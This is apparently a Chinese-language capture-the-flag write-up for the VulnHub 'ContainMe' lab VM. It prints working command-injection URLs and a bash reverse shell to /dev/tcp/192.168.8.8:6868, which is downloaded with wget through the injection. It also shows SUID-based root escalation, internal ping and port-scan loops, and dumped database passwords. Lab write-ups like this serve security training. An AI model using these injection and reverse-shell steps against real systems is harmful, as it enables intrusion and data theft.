# THM-ContainMe-v4

[toc]

> 靶机地址：[ContainMe: 1](https://www.vulnhub.com/entry/containme-1,729/)
>
> 下载地址：[**THM-ContainMe-v4.ova** (Size: 2.2 GB)](https://download.vulnhub.com/containme/THM-ContainMe-v4.ova)

### 信息收集

**主机发现**

```bash
sudo arp-scan -l   
```

![image-20230916193734432](./imgs/image-20230916193734432.png)

**端口扫描**

```bash
sudo nmap -A -p- 192.168.8。9
```

![image-20230916194135574](./imgs/image-20230916194135574.png)

**目录扫描**

```bash
sudo dirb http://192.168.8.9
```

![image-20230916194149685](./imgs/image-20230916194149685.png)

```bash
dirsearch -u 192.168.8.9 -i 200
```

![image-20230916194236035](./imgs/image-20230916194236035.png)

发现三个文件`index.php,index.html,info.php`

依次访问看一下

`index.html`

![image-20230916194305959](./imgs/image-20230916194305959.png)

---

`info.php`

![image-20230916194317899](./imgs/image-20230916194317899.png)

返回了`php探针`

---

`index.php`

![image-20230916194333387](./imgs/image-20230916194333387.png)

页面结果好像执行了`ls -la`命令

查看页面源代码：

![image-20230916194350512](./imgs/image-20230916194350512.png)

### 漏洞利用

#### 模糊测试 fuzz ?

> [什么是fuzz](https://blog.csdn.net/qq_33583069/article/details/131481577)
>
> [什么是模糊测试？](https://blog.csdn.net/m0_57290404/article/details/122366920)
>
> [wfuzz使用1](https://blog.csdn.net/JBlock/article/details/88619117)
>
> [wfuzz使用2](https://blog.csdn.net/weixin_45059752/article/details/122359921)

wfuzz自动字典位置`/usr/share/wfuzz/wordlist`

```bash
wfuzz -c -u http://192.168.80.139/index.php?FUZZ=../../../../../../etc/passwd -w /usr/share/wfuzz/wordlist/general/common.txt --hh 329
```





发现了参数path,手动确认一下:

```bash
http://192.168.80.139/index.php?path=/etc/passwd
```

![image-20230916194428312](./imgs/image-20230916194428312.png)

![image-20230916194510571](./imgs/image-20230916194510571.png)

```bash
http://192.168.8.9/index.php?path=/etc
```

![image-20230916194520924](./imgs/image-20230916194520924.png)



```bash
http://192.168.8.9/index.php?path=;id
```



![image-20230916194547965](./imgs/image-20230916194547965.png)

发现确实存在命令执行漏洞

查看那个目录可以写入文件

```bash
http://192.168.8.9/index.php?path=;%20ls%20-l%20%20/
```

![image-20230916194636688](./imgs/image-20230916194636688.png)



kali上开启http服务

```bash
python -m http.server 80
```

![image-20230916194818827](./imgs/image-20230916194818827.png)

写一个反弹shell

```bash
#!/bin/bash
# code.sh
bash -i &> /dev/tcp/192.168.8.8/6868 0>&1;
```



在地址栏中输入

```bash
http://192.168.8.9/index.php?path=;wget -P /tmp 192.168.8.8/code.sh;ls -la /tmp;
```

![image-20230916195149426](./imgs/image-20230916195149426.png)

写入脚本文件后在kali端开启对`6868`端口的监听

```bash
nc -lvp 6868
```



![image-20230906200735088](./imgs/image-20230906200735088.png)

然后利用命令执行漏洞使用`bash`进行执行`code.sh`文件，命令：`bash /tmp/code.sh`，成功获得shell权限



![image-20230916200023465](./imgs/image-20230916200023465.png)

### 提权

查看是否有能以`root`身份执行的文件

```bash
 sudo -l
```

![image-20230906202540057](./imgs/image-20230906202540057.png)



查看`/home`

![image-20230906201530022](./imgs/image-20230906201530022.png)

```bash
  find / -user root -perm /4000 2>/dev/null
```

![image-20230906202642258](./imgs/image-20230906202642258.png)

发现`mike`用户家目录下的`1cryptupx`和使用`find`命令查看出来的`suid`中都有类似的`crypt`

那就`cd /usr/share/man/zh_TW/` 执行该`crypt`文件，看看效果

![image-20230906203112538](./imgs/image-20230906203112538.png)



![image-20230916200207495](./imgs/image-20230916200207495.png)

拿到交互shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

拿到root后，并没有拿到真正的权限，而在处在Docker容器里

![image-20230916200951062](./imgs/image-20230916200951062.png)

扫描存活的主机

```bash
for i in {1..254} ;do (ping 172.16.20.$i -c 1 -w 5 >/dev/null && echo "172.16.20.$i" &) ;done
```

![image-20230916201003072](./imgs/image-20230916201003072.png)

扫描端口

```bash
for port in {1..65535}; do
   echo >/dev/tcp/172.16.20.6/$port &&
     echo "port $port is open"
 done 2>/dev/null |grep open

```



![image-20230916200801683](./imgs/image-20230916200801683.png)

利用ssh密钥登陆到`mike`用户上

```ssh
```

![image-20230916201133433](./imgs/image-20230916201133433.png)

![image-20230916201149939](./imgs/image-20230916201149939.png)

![image-20230916201232267](./imgs/image-20230916201232267.png)

查看开放的端口

![image-20230916201314460](./imgs/image-20230916201314460.png)

连接Mysql

![image-20230916201350085](./imgs/image-20230916201350085.png)

获取数据

![image-20230916201455678](./imgs/image-20230916201455678.png)

```
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | bjsig4868fgjjeog    |
| mike  | WhatAreYouDoingHere |
+-------+---------------------+
```

![image-20230916201658086](./imgs/image-20230916201658086.png)
